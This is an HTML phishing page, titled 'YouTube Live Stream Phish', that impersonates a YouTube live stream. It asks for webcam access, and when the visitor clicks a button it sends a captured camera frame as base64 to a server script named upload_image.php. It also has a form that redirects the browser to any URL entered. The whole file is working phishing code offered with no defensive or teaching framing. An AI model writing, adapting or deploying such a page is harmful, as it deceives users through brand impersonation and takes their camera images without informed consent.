<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Live Stream Phish</title>
    <style>
        /* Basic styles */
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #000;
            color: #fff;
        }
        video {
            width: 80%;
            border: 2px solid red;
        }
    </style>
</head>
<body>
    <h1>YouTube Live Stream</h1>
    <video id="video" autoplay></video>
    <button id="capture">Capture Image</button>
    <form id="redirectForm">
        <label for="url">Enter URL to Redirect:</label>
        <input type="text" id="url" placeholder="https://example.com" required>
        <button type="submit">Go</button>
    </form>

    <script>
        const video = document.getElementById('video');
        const captureButton = document.getElementById('capture');
        const redirectForm = document.getElementById('redirectForm');

        // Request webcam access
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("Error accessing webcam: " + err);
            });

        // Capture the image
        captureButton.addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/png');

            // Send image data to server
            fetch('upload_image.php', {
                method: 'POST',
                body: JSON.stringify({ image: imageData }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log('Image uploaded successfully:', data);
            })
            .catch(error => {
                console.error('Error uploading image:', error);
            });
        });

        // Redirect to specified URL
        redirectForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const url = document.getElementById('url').value;
            if (url) {
                window.location.href = url;  // Redirect to the chosen URL
            }
        });
    </script>
</body>
</html>
